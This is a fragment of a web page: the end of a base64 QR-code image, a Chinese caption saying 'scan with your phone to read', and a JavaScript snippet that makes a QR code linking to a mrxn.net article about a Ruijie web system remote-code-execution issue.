B58ConCx5ITgHR1QuBs4lDqpXbBpIRBe+5gSugbzm3E9X/ZaB5LrVVcDXE4zRgGOgyjcfOPyaupF/vsAxl35/0ht0rsfgHsCm15doguLOLBpg22diYa8RJ+u8YnC9/G7fMpDe9Iq/fgI/NhA9HbK+NXGx5MBPTOeTXyEca1QLRw4cg3HVp3NgLTBS6i0LIV+WeIXAdotqTjXVai7+jw0kC1z4uROYBlIn2P1Hrase/ISEA8e1B5iLJjkwn1jYNT2uGpjraz61QrAWjNLFlJeBc3CO0q0svZ7FaSDPFl66nzmBMRA4nz4cc2dbgV2XpwXMpQYcA6G211rY45FYOOm7SJ1SqQGmtZIL1iZgfbhoVhjNPYRjv2jBPHD96eTjzT7GDXmzff212/kPAAD//35L9NYAAAAGSURBVAMApzBppCcxGF0AAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/ruijieweb-system\_pi-timeout-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 